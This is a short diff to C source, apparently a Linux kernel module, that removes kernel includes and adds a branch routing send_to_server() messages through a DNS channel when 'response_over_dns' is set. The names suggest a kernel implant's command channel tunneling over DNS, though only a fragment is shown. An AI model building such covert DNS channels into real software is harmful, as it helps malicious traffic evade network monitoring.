@@ -1,15 +1,3 @@
-#include <linux/errno.h>
-#include <linux/fcntl.h>
-#include <linux/fs.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/net.h>
-#include <linux/slab.h>
-#include <linux/socket.h>
-#include <linux/string.h>
-#include <linux/types.h>
-#include <linux/uio.h>
-
 #include "network.h"
 
 /*
@@ -69,6 +57,10 @@ static char *format_string(const char *fmt, ...) {
 
 // Formats and sends a message to the server
 int send_to_server(char *message, ...) {
+    if (response_over_dns) {
+        return dns_send_data(message, strlen(message));
+    }
+
     if (!get_worker_socket()) {
         ERR_MSG("send_to_server: socket is not initialized\n");
         return -EINVAL;
